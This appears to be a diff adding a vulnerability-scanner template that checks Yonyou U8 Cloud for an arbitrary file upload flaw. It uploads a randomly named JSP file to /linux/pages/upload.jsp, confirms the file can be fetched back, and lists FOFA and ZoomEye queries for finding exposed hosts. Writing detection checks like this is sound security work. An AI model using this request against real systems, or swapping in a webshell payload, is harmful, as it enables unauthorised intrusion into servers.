@@ -1,0 +1,31 @@
+id: yonyou-u8-cloud-fileupload
+
+info:
+  name: 用友U8 Cloud upload任意文件上传
+  author: zan8in
+  severity: critical
+  verified: true
+  description: |-
+    FOFA: app="用友-U8-Cloud"
+    ZoomEye: app:"用友-U8-Cloud"
+  tags: yonyou,u8,fileupload
+  created: 2023/10/25
+
+set:
+  randstr: randomLowercase(6)
+  randbody: randomLowercase(32)
+rules:
+  r0:
+    request:
+      method: POST
+      path: /linux/pages/upload.jsp
+      headers:
+        filename: "{{randstr}}.jsp"
+      body: "{{randbody}}"
+    expression: response.status == 200
+  r1:
+    request:
+      method: GET
+      path: /linux/{{randstr}}.jsp
+    expression: response.status == 200 && response.body.bcontains(bytes(randbody))
+expression: r0() && r1()
